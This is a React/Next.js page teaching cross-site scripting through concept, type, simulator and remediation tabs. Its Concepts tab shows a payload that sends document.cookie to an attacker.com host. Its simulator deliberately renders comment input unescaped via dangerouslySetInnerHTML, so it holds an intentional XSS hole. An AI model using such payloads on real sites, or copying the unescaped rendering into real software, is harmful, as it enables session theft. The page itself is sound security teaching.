"use client"

import { useState } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  ArrowLeft, Bug, Shield, ShieldAlert, Code, MonitorPlay, AlertTriangle, CheckCircle2, MessageSquare, Terminal, Server, Globe, FileCode
} from "lucide-react"
import Link from "next/link"
import { cn } from "@/lib/utils"

type Tab = "concepts" | "types" | "simulator" | "remediation"

const TABS: { id: Tab; label: string }[] = [
  { id: "concepts", label: "Concepts" },
  { id: "types", label: "XSS Types" },
  { id: "simulator", label: "💬 Simulator" },
  { id: "remediation", label: "Remediation" },
]

export default function XSSPage() {
  const [tab, setTab] = useState<Tab>("concepts")
  return (
    <main className="min-h-screen bg-[#0a0a0a] text-white p-4 sm:p-8 selection:bg-red-500/30">
      <nav className="flex justify-between items-center mb-8 max-w-7xl mx-auto">
        <Link href="/" className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors group text-sm">
          <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
          Back to Dashboard
        </Link>
        <div className="px-4 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-2">
          <Bug className="w-3 h-3" /> XSS · Security
        </div>
      </nav>

      <div className="max-w-7xl mx-auto space-y-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-3">
          <h1 className="text-5xl sm:text-6xl font-black tracking-tighter bg-linear-to-br from-white via-white to-red-400 bg-clip-text text-transparent">
            Cross-Site Scripting
          </h1>
          <p className="text-gray-500 text-sm leading-relaxed max-w-2xl">
            Understand how attackers inject malicious client-side scripts into trusted web responses, bypassing the Same-Origin Policy to steal tokens, log keystrokes, and hijack sessions.
          </p>
        </motion.div>

        <div className="flex gap-2 flex-wrap pb-2 border-b border-white/5">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)} className={cn(
              "px-5 py-2 rounded-full text-[11px] font-bold uppercase tracking-wider transition-all border",
              tab === t.id ? "bg-red-600 border-red-400 text-white shadow-lg shadow-red-500/20" : "bg-white/5 border-white/10 text-gray-500 hover:border-white/20 hover:text-gray-200"
            )}>{t.label}</button>
          ))}
        </div>

        <AnimatePresence mode="wait">
          <motion.div key={tab} initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -16 }} transition={{ duration: 0.18 }}>
            {tab === "concepts" && <ConceptsTab />}
            {tab === "types" && <TypesTab />}
            {tab === "simulator" && <SimulatorTab />}
            {tab === "remediation" && <RemediationTab />}
          </motion.div>
        </AnimatePresence>
      </div>
    </main>
  )
}

/* ════════ CONCEPTS ════════ */
function ConceptsTab() {
  return (
    <div className="space-y-6">
      <div className="glass p-8 rounded-[32px] border-white/5 space-y-6">
        <div className="flex items-center gap-4 border-b border-white/5 pb-6">
          <div className="p-4 rounded-2xl bg-red-500/10 border border-red-500/20 text-red-400">
            <ShieldAlert className="w-8 h-8" />
          </div>
          <div>
            <h2 className="text-2xl font-black text-white">The Anatomy of an XSS Attack</h2>
            <p className="text-sm text-gray-400 mt-1">Bypassing trust through dynamic execution</p>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          <div className="space-y-4">
             <h3 className="text-sm font-bold uppercase tracking-widest text-[#fff]">The Vulnerability</h3>
             <p className="text-sm text-gray-400 leading-relaxed">
               Cross-Site Scripting (XSS) occurs when a web application includes untrusted data in a web page without proper validation or escaping. If this payload is rendered to the browser, the browser treats it as executable code originating from the trusted domain.
             </p>
             <p className="text-sm text-gray-400 leading-relaxed">
               Because the script originated from the application's domain, it executes within the context of the user's session, bypassing the <strong className="text-red-400">Same-Origin Policy (SOP)</strong>.
             </p>
          </div>
          <div className="space-y-4">
             <h3 className="text-sm font-bold uppercase tracking-widest text-red-400">Attacker Capabilities</h3>
             <ul className="space-y-3">
               {[
                 "Read `document.cookie` to steal session tokens (if not HttpOnly).",
                 "Capture keystrokes, form inputs, and passwords.",
                 "Rewrite the DOM to present fake login screens (phishing).",
                 "Make silent fetch/XHR requests to the API acting as the user.",
               ].map((item, i) => (
                 <li key={i} className="flex gap-3 text-sm text-gray-400 items-start">
                    <Bug className="w-4 h-4 text-red-500 shrink-0 mt-0.5" />
                    <span>{item}</span>
                 </li>
               ))}
             </ul>
          </div>
        </div>

        <div className="bg-[#111] border border-white/5 p-6 rounded-2xl font-mono text-[11px] overflow-x-auto relative">
           <div className="absolute top-0 right-0 px-3 py-1 bg-white/10 text-gray-400 text-[9px] rounded-bl-lg font-bold">XSS PAYLOAD</div>
           <p className="text-gray-500">// Attacker injects this into a comment field</p>
           <p className="text-red-400 mt-2">&lt;script&gt;</p>
           <p className="pl-4 text-white">fetch('https://attacker.com/log?cookie=' + btoa(document.cookie));</p>
           <p className="text-red-400">&lt;/script&gt;</p>
           <p className="text-gray-500 mt-2">// Or an image payload (no script tags needed)</p>
           <p className="text-red-400">&lt;img src="x" onerror="alert(document.domain)"&gt;</p>
        </div>
      </div>
    </div>
  )
}

/* ════════ TYPES ════════ */
function TypesTab() {
  const types = [
    {
      id: "stored",
      name: "Stored XSS (Persistent)",
      icon: <Server className="w-6 h-6" />,
      color: "red",
      desc: "The payload is permanently saved on the target server (e.g., in a database, forum post, or comment section). Any user who visits the affected page will blindly execute the payload.",
      flow: [
        "1. Attacker posts `<script>...` to a blog comment.",
        "2. Server saves the comment in the database.",
        "3. Victim visits the blog post.",
        "4. Server serves the HTML containing the attacker's script.",
        "5. Victim's browser executes the payload."
      ],
      severity: "CRITICAL"
    },
    {
      id: "reflected",
      name: "Reflected XSS (Non-Persistent)",
      icon: <Globe className="w-6 h-6" />,
      color: "amber",
      desc: "The payload is immediately 'reflected' off the web application. Typically embedded within a URL parameter or form input. The attacker must trick the victim into clicking a specific crafted link.",
      flow: [
        "1. Attacker creates link: `site.com/search?q=<script>...`",
        "2. Attacker sends link to victim via email/chat.",
        "3. Victim clicks the link.",
        "4. Server reflects the query string directly into the HTML response.",
        "5. Victim's browser executes the payload."
      ],
      severity: "HIGH"
    },
    {
      id: "dom",
      name: "DOM-Based XSS",
      icon: <MonitorPlay className="w-6 h-6" />,
      color: "violet",
      desc: "The vulnerability exists entirely in the client-side code rather than the server response. The payload modifies the DOM environment in the victim's browser, passing malicious data into dangerous Javascript sinks (like innerHTML or eval).",
      flow: [
        "1. App uses JS to read URL fragment: `let q = location.hash;`",
        "2. App writes directly to DOM: `div.innerHTML = q;`",
        "3. Victim visits `site.com/#<img src=x onerror=...>`",
        "4. Server never sees the #fragment (not sent in HTTP).",
        "5. Client-side JS executes the payload locally."
      ],
      severity: "HIGH"
    }
  ]

  const colorCls: Record<string, string> = {
    red: "bg-red-500/5 border-red-500/20 text-red-400",
    amber: "bg-amber-500/5 border-amber-500/20 text-amber-400",
    violet: "bg-violet-500/5 border-violet-500/20 text-violet-400"
  }

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
      {types.map(t => (
        <div key={t.id} className={cn("glass p-6 rounded-[24px] border space-y-5", colorCls[t.color].replace("bg-", "hover:bg-").replace("5", "10").replace("text-", "border-"))}>
          <div className="flex justify-between items-start">
             <div className={cn("p-3 rounded-xl border", colorCls[t.color])}>{t.icon}</div>
             <span className={cn("text-[9px] font-black tracking-widest px-2 py-1 rounded bg-black/40 border", colorCls[t.color])}>{t.severity}</span>
          </div>
          <div>
             <h3 className="text-xl font-black text-white leading-tight">{t.name}</h3>
             <p className="text-xs text-gray-400 mt-2 leading-relaxed">{t.desc}</p>
          </div>
          
          <div className="bg-black/30 p-4 rounded-xl space-y-2 border border-white/5">
             <span className="text-[9px] font-black uppercase text-gray-500">Attack Flow</span>
             <ul className="space-y-1.5">
               {t.flow.map((step, i) => (
                 <li key={i} className="text-[10px] text-gray-400 font-mono leading-tight">{step}</li>
               ))}
             </ul>
          </div>
        </div>
      ))}
    </div>
  )
}

/* ════════ SIMULATOR ════════ */
function SimulatorTab() {
  const [messages, setMessages] = useState<{id: number, text: string, sender: string}[]>([
    { id: 1, text: "Welcome to the forum! Feel free to leave a comment.", sender: "Admin" }
  ])
  const [input, setInput] = useState("")
  const [isSecure, setIsSecure] = useState(false)
  const [hacked, setHacked] = useState(false)

  const handleSend = () => {
    if (!input.trim()) return
    
    // Process input
    let finalInput = input
    
    // Simulate XSS Execution if not secure
    if (!isSecure && (input.includes("<script>") || input.includes("onerror="))) {
      setHacked(true)
      setTimeout(() => setHacked(false), 3000) // Reset after 3s
    }

    // In 'secure' mode, we sanitize
    if (isSecure) {
      finalInput = finalInput.replace(/</g, "&lt;").replace(/>/g, "&gt;")
    }

    setMessages([...messages, { id: Date.now(), text: finalInput, sender: "You" }])
    setInput("")
  }

  const examples = [
    "Hello there!",
    "<i>Formatting</i>",
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>"
  ]

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 relative">
      {/* Visual representation of an alert overlay */}
      <AnimatePresence>
        {hacked && (
          <motion.div initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.8 }}
            className="absolute inset-0 z-50 flex items-center justify-center pointer-events-none">
            <div className="bg-white text-black p-6 rounded-xl shadow-2xl border border-gray-300 w-80 text-center space-y-4">
              <AlertTriangle className="w-12 h-12 text-red-500 mx-auto" />
              <div>
                <p className="font-bold">site.com says:</p>
                <p className="text-sm mt-1">XSS! Your cookies are mine!</p>
              </div>
              <div className="bg-blue-500 text-white rounded px-4 py-1.5 text-sm font-bold w-fit mx-auto">OK</div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="glass p-6 rounded-[32px] border-white/5 space-y-4 flex flex-col h-[500px]">
        <div className="flex justify-between items-center border-b border-white/5 pb-4">
          <h3 className="text-lg font-black flex items-center gap-2">
            <MessageSquare className="w-5 h-5 text-blue-400" />
            Comment Board
          </h3>
          <button onClick={() => setIsSecure(!isSecure)} className={cn("px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border transition-all flex items-center gap-1.5 scale-95", 
            isSecure ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" : "bg-red-500/10 text-red-400 border-red-500/30"
          )}>
             {isSecure ? <CheckCircle2 className="w-3 h-3" /> : <AlertTriangle className="w-3 h-3" />}
             {isSecure ? "Secured (Escaping On)" : "Vulnerable (Raw HTML)"}
          </button>
        </div>

        <div className="flex-1 overflow-y-auto space-y-3 bg-black/40 p-4 rounded-xl border border-white/5">
          {messages.map(m => (
            <div key={m.id} className="space-y-1">
              <span className="text-[10px] font-bold text-gray-500">{m.sender}</span>
              {/* Dangerous innerHTML usage depending on mode simulation */}
               <div className={cn("p-3 rounded-r-xl rounded-bl-xl text-sm border inline-block", m.sender === "Admin" ? "bg-blue-500/10 border-blue-500/20 text-gray-200" : "bg-white/5 border-white/10 text-gray-300")}>
                  {/* We use dangerouslySetInnerHTML to actually simulate the XSS vulnerability correctly on the frontend! */}
                  <span dangerouslySetInnerHTML={{ __html: m.text }} className="break-all" />
               </div>
            </div>
          ))}
        </div>

        <div className="flex gap-2">
           <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleSend()} placeholder="Type a comment..." className="flex-1 bg-black/40 border border-white/10 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-white/30 font-mono" />
           <button onClick={handleSend} className="bg-white text-black px-4 py-2 rounded-xl text-sm font-bold uppercase tracking-wide hover:bg-gray-200">Post</button>
        </div>
      </div>

      <div className="space-y-4">
         <div className="glass p-6 rounded-[24px] border-white/5 space-y-4">
            <h3 className="text-sm font-black uppercase tracking-widest text-[#fff]">Payload Sandbox</h3>
            <p className="text-xs text-gray-400">Click a payload to test it against the comment board. Notice how toggling 'Vulnerable' dictates if the script runs or is treated as plain text.</p>
            <div className="space-y-2">
              {examples.map((ex, i) => (
                <button key={i} onClick={() => setInput(ex)} className="w-full text-left p-3 rounded-xl bg-white/5 border border-white/10 hover:border-white/30 transition-colors font-mono text-[11px] text-gray-300">
                  {ex}
                </button>
              ))}
            </div>
         </div>

         <div className={cn("glass p-6 rounded-[24px] border transition-colors", !isSecure ? "bg-red-500/5 border-red-500/20" : "bg-emerald-500/5 border-emerald-500/20")}>
            <p className={cn("text-[10px] font-black uppercase tracking-widest pb-2", !isSecure ? "text-red-400" : "text-emerald-400")}>Under The Hood</p>
            <pre className="text-[10px] font-mono whitespace-pre-wrap text-gray-400">
{`// Context: React DOM Rendering

// Secured (React Default)
const content = userInput;
<div>{content}</div> // React escapes <> implicitly

// Vulnerable (Bypassing Protection)
const content = userInput;
<div dangerouslySetInnerHTML={{ __html: content }} />`}
            </pre>
         </div>
      </div>
    </div>
  )
}

/* ════════ REMEDIATION ════════ */
function RemediationTab() {
  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div className="glass p-6 rounded-[32px] border-emerald-500/20 bg-emerald-500/5 space-y-4">
          <div className="flex items-center gap-3">
             <Shield className="w-6 h-6 text-emerald-400" />
             <h2 className="text-xl font-black text-emerald-400">Defense in Depth</h2>
          </div>
          <p className="text-sm text-gray-400 leading-relaxed">Preventing XSS requires multiple layers of defense. Complete eradication depends on context-aware output encoding.</p>
          
          <div className="space-y-3 pt-4">
             <div className="p-4 rounded-xl border border-emerald-500/20 bg-emerald-500/10">
                <h3 className="text-xs font-bold text-emerald-300 uppercase tracking-widest mb-1.5">1. Context-Aware Output Encoding</h3>
                <p className="text-[11px] text-gray-400">Never insert user data directly. E.g. replace <code>&lt;</code> with <code>&amp;lt;</code>. You must encode differently for HTML bodies, JavaScript contexts, and CSS contexts. Use native framework protections (like React's default behavior).</p>
             </div>
             
             <div className="p-4 rounded-xl border border-emerald-500/20 bg-emerald-500/10">
                <h3 className="text-xs font-bold text-emerald-300 uppercase tracking-widest mb-1.5">2. Content Security Policy (CSP)</h3>
                <p className="text-[11px] text-gray-400">A strict HTTP Header that restricts where scripts can load from. E.g., <code>Content-Security-Policy: default-src 'self'; script-src 'self'</code> kills inline scripts completely, stopping most XSS.</p>
             </div>

             <div className="p-4 rounded-xl border border-emerald-500/20 bg-emerald-500/10">
                <h3 className="text-xs font-bold text-emerald-300 uppercase tracking-widest mb-1.5">3. HttpOnly Cookies</h3>
                <p className="text-[11px] text-gray-400">If you must use Cookies for session tokens, always flag them as <code>HttpOnly</code>. This makes them invisible to <code>document.cookie</code>, preventing attackers from stealing the token even if an XSS vulnerability exists.</p>
             </div>
          </div>
        </div>

        <div className="space-y-4 flex flex-col">
          <div className="glass p-6 rounded-[24px] border-white/5 space-y-3 flex-1">
             <h3 className="text-sm font-black uppercase tracking-widest">Dangerous React Sinks</h3>
             <pre className="bg-black/50 border border-red-500/20 p-4 rounded-xl text-[11px] font-mono text-red-300 text-wrap">
               {`<div dangerouslySetInnerHTML={{ __html: data }} />\n\n<a href={userInput}>Click</a> // JS payload: javascript:alert(1)`}
             </pre>
          </div>
          
          <div className="glass p-6 rounded-[24px] border-white/5 space-y-3 flex-1">
             <h3 className="text-sm font-black uppercase tracking-widest">Safe HTML Rendering</h3>
             <p className="text-xs text-gray-400">If you *must* render Markdown or raw HTML from users (e.g. blog CMS), you must sanitize it with a proven library like DOMPurify before setting it.</p>
             <pre className="bg-black/50 border border-emerald-500/20 p-4 rounded-xl text-[11px] font-mono text-emerald-300 text-wrap">
               {`import DOMPurify from 'dompurify';\n\nconst cleanHMTL = DOMPurify.sanitize(dirtyInput);\n<div dangerouslySetInnerHTML={{ __html: cleanHMTL }} />`}
             </pre>
          </div>
        </div>
      </div>
    </div>
  )
}
